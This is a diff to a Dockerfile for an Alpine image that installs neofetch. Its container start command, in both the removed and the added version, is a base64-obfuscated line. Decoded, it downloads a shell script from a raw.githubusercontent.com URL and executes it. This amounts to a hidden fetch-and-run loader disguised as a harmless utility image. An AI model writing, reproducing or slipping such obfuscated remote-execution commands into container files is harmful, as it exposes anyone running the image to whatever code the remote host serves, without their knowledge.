@@ -1,4 +1,3 @@
 FROM alpine
-RUN apk add --no-cache bash neofetch
-SHELL ["/bin/bash", "-c"]
-CMD exec /bin/sh <(echo d2dldCAtcU8gLSBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vZ29vZncvY21kL0hFQUQvc2gK | base64 -d | source /dev/stdin)
+RUN apk add --no-cache neofetch
+CMD echo d2dldCAtcU8gL3Jvb3QvY21kLnNoIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9nb29mdy9jbWQvSEVBRC9zaCAmJiBleGVjIC9iaW4vc2ggL3Jvb3QvY21kLnNoCg== | base64 -d | source /dev/stdin
